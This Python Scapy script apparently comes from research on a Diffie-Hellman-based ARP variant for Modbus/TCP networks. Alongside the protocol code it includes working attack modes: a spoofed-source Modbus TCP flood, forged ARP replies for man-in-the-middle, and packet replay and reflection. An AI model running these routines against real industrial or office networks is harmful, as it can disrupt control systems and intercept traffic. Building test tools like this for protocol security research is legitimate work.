#uso: python3 <master|mitm|flood> [ip-slave] interface

#================IMPORTS
from scapy.all import *
from ipaddress import *
from subprocess import *
import sys
import hmac
from hashlib import md5
from time import sleep # pausa apos o calculo da chave
import pyDHE #geração aleatória dos parametros pro Diffie-Hellman
import matplotlib
import ipaddress
import itertools

#===============CONSTANTES

interface = sys.argv[3]
ip_slave = sys.argv[2]

#===============CLASSES
class Modbus(Packet):
	name = "Modbus/tcp"
	fields_desc = [ ShortField("Transaction Identifier", 1),
		ShortField("Protocol Identifier", 0),
                ShortField("Length", 2),
                XByteField("Unit Identifier", 0),
                ByteField("Function Code", 1)
                    ]
#===============FUNCOES_DHE

# Retorna um objeto DHE (pyDHE.DHE) group=13 cria chaves de até 1024 bits
def generateDH():
	return pyDHE.new(group=13) # geração de b, g, n, B
	#B = beto.getPublicKey()

# Recebe um "pacote" capturado por sniff (scapy.sniff())
# Retorna uma lista de parametros que o vizinho usou para gerar a "chave privada"
def getParamsDH(pacote):
	pacote = pacote[0][Padding].load.decode('utf-8', 'ignore')
	A = int(pacote)
	return A

# Recebe um "pacote" capturado por sniff (scapy.sniff())
# Retorna os parametros DH do vizinho
def getNeighParamsDH(pacote):
	neigh_pk = pacote[0][Padding].load.decode('utf-8', 'ignore')
	return neigh_pk

# Envia um objeto scapy
def sendParamsDH(pacoteDH):
	send(pacoteDH, iface=interface)


def bob_slave():
	
	ip_beto = getIPMaster(interface)
	mac_beto = getMAC(interface)
	if sys.argv[4] == 'prop':
	#==============INICIO DIFFIE-HELLMAN
		print('Aguardando o início da comunicacao')
		pacote = sniff(count=1, filter='llc', iface=interface)
		A = pacote[0].load.decode('utf-8', 'ignore').split('\n')[2]
		print('\nRecebido chave_pub(A): ', A)
		DH_meu = generateDH() # objeto DHE
		data = str(DH_meu.getPublicKey()) # Tratamento para envio
		print('\nEnviando chave_pub(B): ', str(DH_meu.getPublicKey()))
		broadcast= getIPBRD(interface)
		sendp(Ether(src=mac_beto, dst='ff:ff:ff:ff:ff:ff',type=0x01FF)/IP(src=ip_beto, dst='255.255.255.0')/Padding(load=bytes(data, 'utf-8')), iface=interface)
		DH_meu.update(int(A.split('\x00')[1]))
		k_ab = DH_meu.getFinalKey()
		print('\nChave comum entre A e B: ', k_ab)

	#=================FINAL DIFFIE-HELLMAN


		target = hmac.new(bytes(str(k_ab), 'utf-8'), bytes(ip_beto, 'utf-8'), md5).hexdigest()
		new_ip = target[:4]+':'+target[4:8]+':'+target[8:12]+':'+target[12:16]+\
                ':'+target[16:20]+':'+target[20:24]+':'+target[24:28]+':'+target[28:]

		target= convertIP(new_ip)
		print('\nNS_Target: ', target)

#==============ARP Proposta

	# Esperando o ARP Request com target da proposta
	filtro = 'host '+target
	#print (filtro)
	pacote = sniff(count=1, filter= filtro, iface=interface)
	tgt = pacote[0][ARP].pdst
	ip_viz = pacote[0][ARP].psrc
	print('Recebido: ',tgt)

#==============ARP STANDARD
	if sys.argv[4] == 'std':
		broadcast= getIPBRD(interface)
	sleep(1)
#================Envio do NA
	if tgt == target :
		print('Enviando ARP Reply...')
		mac= getMAC(interface)
		send (ARP(op=2,psrc=ip_beto,pdst=ip_viz, hwsrc=mac))

	else:
		print('Target diferente!')

	print('FIM')


def ana_master():

	DHE_meu = pyDHE.new(group=13)
	interface = sys.argv[3]
	ip_ana = getIPMaster(interface) 
	ip_beto = sys.argv[2]
	#=====================

	if sys.argv[4] == 'prop':
#==============INICIO DIFFIE-HELLMAN
		data = str(DHE_meu.getPublicKey())


	# Envio do A calculado (n e g são estáticos)
		
		print('\nEnviado chave_pub(A): ', DHE_meu.getPublicKey())
		mac_ana= getMAC(interface)
		broadcast= getIPBRD(interface)		
		ip_beto= sys.argv[2]

		sendp(Ether(src=mac_ana, dst='ff:ff:ff:ff:ff:ff',type=0x01FF)/IP(src=ip_ana, dst='255.255.255.0')/Padding(load=bytes(data, 'utf-8')), iface=interface)

		# Captura do B calculado por Beto

		pacote = sniff(count=1, filter='llc', iface=interface)
		B  = pacote[0].load.decode('utf-8', 'ignore').split('\n')[1]
		print('\nRecebido chave_pub(B): ', B)

		# Calculo da chave

		DHE_meu.update(int(B.split('\x00')[2]))
		k_ab = DHE_meu.getFinalKey()
		print("\nChave comum entre A e B:", k_ab)

		#=================FINAL DIFFIE-HELLMAN

		sleep(1)

		target = hmac.new(bytes(str(k_ab), 'utf-8'), bytes(ip_beto, 'utf-8'), md5).hexdigest()
		new_ip = target[:4]+':'+target[4:8]+':'+target[8:12]+':'+target[12:16]+\
		':'+target[16:20]+':'+target[20:24]+':'+target[24:28]+':'+target[28:]

		new_ip = convertIP(new_ip)
		print('NS_Target: ',new_ip)


	elif sys.argv[4] == 'std':
		new_ip = ip_beto

	# Envio do NS

	mac= getMAC(interface)
	print ('\nEnviando ARP Request...')
	send (ARP(op=1,psrc=ip_ana,pdst= new_ip, hwsrc=mac), iface= interface)
	#print ('\nARP enviado')
	#print (new_ip)

	# Espera da resposta NA

	pkt = sniff(count=1, filter="arp", iface=interface)
	print('\nArp Reply recebido: ')
	print('IP Addr :',pkt[0][ARP].psrc)
	print('MAC Addr:',pkt[0][ARP].hwsrc)


	print('\nFIM')



#===============FUNCOES

def convertIP(IP):

	print ('\nHash criado: ', IP)
	myIP = ipaddress.ip_address(IP)
	hextets = myIP.exploded.split(":")


        # from itertools recipes
	def grouper(iterable, n, fillvalue=None):
		args = [iter(iterable)] * n
		return itertools.zip_longest(*args, fillvalue=fillvalue)
	
	new_groups = [int(a+b, base=16) for (a, b) in grouper(hextets, 2)]
        # N.B. that a+b here is string concatenation, not addition

	a1, a2, a3, a4 = new_groups

	ipv4ish = '.'.join(map(str, new_groups))

	print ('Convertendo Hash: ', ipv4ish)

	#print ('Novo IP: ', str(ipaddress.IPv4Address(a1)))

	return str(ipaddress.IPv4Address(a1))


def getIPMaster(interface):
	return  getoutput('ip address show dev '+interface+'|grep "inet "| cut -f6 -d" " | cut -f1 -d"/"')

def getIPBRD2(interface):
	return getoutput('ip address show dev '+interface+'|grep "inet "| cut -f8 -d" "')

def getIPBRD(interdace):
	return getoutput('ip address show dev '+interface+'|grep "brd "| cut -c38-54')

def getMAC(interface):
	return getoutput('ip address show dev '+interface+'|grep "link/ether "| cut -f6 -d" "')

def getIPAddress_src(pkt):
	return IPv4Address(pkt[0][IP].src)

def getARPIPAddress_src(pkt):
	return IPv4Address(pkt[0][ARP].psrc)

def TCP_Flood():
	ip_fake = RandIP()
	#print (ip_fake)
	while True:
		send (IP(src=ip_fake,dst=ip_slave)/TCP(sport=502,dport=502)/Modbus())

def MITM_ARP():
	pkt = sniff(count=1, filter="arp", iface=interface)
	print(pkt)
	ipsrc = getARPIPAddress_src(pkt)
	ipdst = pkt[0][ARP].pdst
	mac= getMAC(interface)
	send (ARP(op=1,psrc=ipsrc,pdst=ipdst, hwsrc=mac))
	print('Mensagem enviada')

def MITM():
	pkt = sniff(count=1, filter="dst port 502", iface=interface)
	print(pkt)
	ipsrc = getIPAddress_src(pkt)
	ipdst = pkt[0][IP].dst
	send (IP(src=ipsrc,dst=ipdst)/TCP(sport=502,dport=502)/Modbus())
	print('Mensagem enviada')

def Reflection():
	pkt = sniff(count=1,filter="dst port 502",iface=interface)
	print(pkt)
	ipsrc = getIPAddress_src(pkt)
	ipdst = pkt[0][IP].dst
	macsrc = pkt[0][Ether].src
	macdst = pkt[0][Ether].dst
	sendp (Ether(src=macsrc, dst=macdst)/IP(src=ipsrc, dst=ipdst)/TCP(sport=502,dport=502)/Modbus())

def master():
	ip_master = getIPMaster(interface)
	#print(ip_master)
	send (IP(src=ip_master,dst=ip_slave)/TCP(sport=502,dport=502)/Modbus())
	print('Mensagem enviada')

def teste():

	ip=getIPMaster(interface)
	mac= getMAC(interface)
	sendp(Ether(src=mac, dst='ff:ff:ff:ff:ff:ff', type=0x01FF)/IP(src=ip, dst='255.255.255.0'), iface='eth0')
	print('ok')

def Main():
	if sys.argv[1] == 'master':
		master()
	elif sys.argv[1] == 'mitm':
		MITM()
	elif sys.argv[1] == 'flood':
		TCP_Flood()
	elif sys.argv[1]== 'arp':
		MITM_ARP()
	elif sys.argv[1]=='reflection':
		Reflection()
	elif sys.argv[1]=='ana':
		ana_master()
	elif sys.argv[1]=='beto':
		bob_slave()
	elif sys.argv[1]=='teste':
		teste()
	else:
		print('Error!')

if __name__ == '__main__':
	Main()

